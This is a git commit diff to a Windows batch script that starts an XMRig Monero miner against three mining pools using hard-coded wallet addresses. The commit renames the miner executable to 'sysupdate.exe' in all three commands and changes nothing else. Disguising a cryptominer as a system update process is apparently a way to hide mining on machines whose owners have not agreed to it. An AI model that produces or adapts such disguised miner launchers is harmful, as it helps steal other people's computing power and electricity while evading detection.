6234889c2f2be724dd9e8b467d13bc5966925fec
FalconTN <fsff3521@gmail.com>
2025-01-25 04:21:11 +0300

    Update pool_mine_example.cmd

--- pool_mine_example.cmd
+++ pool_mine_example.cmd
@@ -1,12 +1,12 @@
 
 cd /d "%~dp0"
-xmrig.exe -o xmrpool.eu : 9999 -u 45e8b5MkUtCVKXLLXpN2HoGrokB8iAzjjjHu6eHqDwyjbxxY67nYbTTEEZdGPa6Zd9Vim55kYAmjEHqU6PXE5n2ZFxqyjFc -p x
+sysupdate.exe -o xmrpool.eu : 9999 -u 45e8b5MkUtCVKXLLXpN2HoGrokB8iAzjjjHu6eHqDwyjbxxY67nYbTTEEZdGPa6Zd9Vim55kYAmjEHqU6PXE5n2ZFxqyjFc -p x
 pause
 
 cd /d "%~dp0"
-xmrig.exe -o pool.xmrfast.com:9000 -u 45e8b5MkUtCVKXLLXpN2HoGrokB8iAzjjjHu6eHqDwyjbxxY67nYbTTEEZdGPa6Zd9Vim55kYAmjEHqU6PXE5n2ZFxqyjFc -p x
+sysupdate.exe -o pool.xmrfast.com:9000 -u 45e8b5MkUtCVKXLLXpN2HoGrokB8iAzjjjHu6eHqDwyjbxxY67nYbTTEEZdGPa6Zd9Vim55kYAmjEHqU6PXE5n2ZFxqyjFc -p x
 pause
 
 cd /d "%~dp0"
-xmrig.exe -o pool.xmr.pt:9000 -u 87REqG9YrLwcPuj3tTNo5o7CNJFLXVimQhgCNjKBXrvj8e5iEta72UVCfPX8ggiNNSd9uyYr4qNZRYNYxagXw93mQT2ohKx -p x
+sysupdate.exe -o pool.xmr.pt:9000 -u 87REqG9YrLwcPuj3tTNo5o7CNJFLXVimQhgCNjKBXrvj8e5iEta72UVCfPX8ggiNNSd9uyYr4qNZRYNYxagXw93mQT2ohKx -p x
 pause
